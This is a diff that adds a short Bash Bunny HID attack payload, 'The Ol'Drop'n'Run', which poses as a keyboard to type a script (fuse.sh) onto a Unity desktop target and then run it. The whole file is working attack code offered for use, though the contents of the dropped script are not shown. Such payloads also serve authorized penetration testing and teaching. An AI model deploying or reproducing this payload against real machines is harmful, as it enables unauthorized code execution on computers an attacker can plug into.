@@ -1,0 +1,30 @@
+#!/bin/bash
+#
+# Title:         The Ol'Drop'n'Run
+# Author:        bg-wa
+# Version:       1.0
+# Category:      HID
+# Target:        UNITY
+# Attackmodes:   HID
+#
+# Quick HID only attack to write a file to target machine and open
+#
+# | Attack Stage        | Description                              |
+# | ------------------- | ---------------------------------------- |
+# | SETUP               | Open vi                                  |
+# | ATTACK              | Writing files                            |
+# | FINISH              | Payload Dropped & ran (remove the bunny) |
+#
+
+ATTACKMODE HID
+LED SETUP
+
+source_script=/root/udisk/payloads/$SWITCH_POSITION/fuse.sh
+target_script=\~/fuse.sh
+
+LED ATTACK
+
+DROP $source_script $target_script true true
+RUN UNITY $target_script
+
+LED FINISH
